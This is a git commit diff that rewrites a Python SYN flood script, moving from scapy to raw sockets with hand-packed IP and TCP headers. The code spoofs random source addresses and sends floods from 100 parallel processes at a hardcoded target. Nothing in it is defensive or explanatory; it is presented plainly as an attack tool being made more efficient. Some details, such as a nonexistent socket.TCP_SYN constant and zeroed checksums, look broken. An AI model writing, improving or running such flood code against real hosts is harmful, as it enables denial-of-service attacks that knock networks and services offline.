2b67c0322e8f89fa37487128ee878046fe2f8898
Nomads Developer <57294366+nomadsdev@users.noreply.github.com>
2024-09-06 16:55:17 +0700

    Optimize SYN flood attack using raw sockets

--- attack_syn.py
+++ attack_syn.py
@@ -1,4 +1,6 @@
-from scapy.all import IP, TCP, RandIP, RandShort, sendpfast
+import socket
+import random
+import struct
 from multiprocessing import Process
 
 target_ip = "192.168.1.1"
@@ -7,15 +9,20 @@ num_processes = 100
 packets_per_process = 1000
 
 def syn_flood(target_ip, target_port):
-    for _ in range(packets_per_process):
-        src_ip = RandIP()
-        src_port = RandShort()
-        
-        ip = IP(src=src_ip, dst=target_ip)
-        tcp = TCP(sport=src_port, dport=target_port, flags="S")
-        packet = ip/tcp
-        
-        sendpfast(packet, pps=1000, verbose=False)
+    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
+        for _ in range(packets_per_process):
+            src_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xFFFFFFFF)))
+            src_port = random.randint(1024, 65535)
+            
+            ip_header = struct.pack('!BBHHHBBH4s4s', 
+                                    69, 0, 40, random.randint(1, 65535), 0, 255, socket.IPPROTO_TCP, 0,
+                                    socket.inet_aton(src_ip), socket.inet_aton(target_ip))
+            
+            tcp_header = struct.pack('!HHLLBBHHH', 
+                                     src_port, target_port, 0, 0, 80, socket.TCP_SYN, 8192, 0, 0)
+
+            packet = ip_header + tcp_header
+            sock.sendto(packet, (target_ip, target_port))
 
 if __name__ == "__main__":
     processes = []
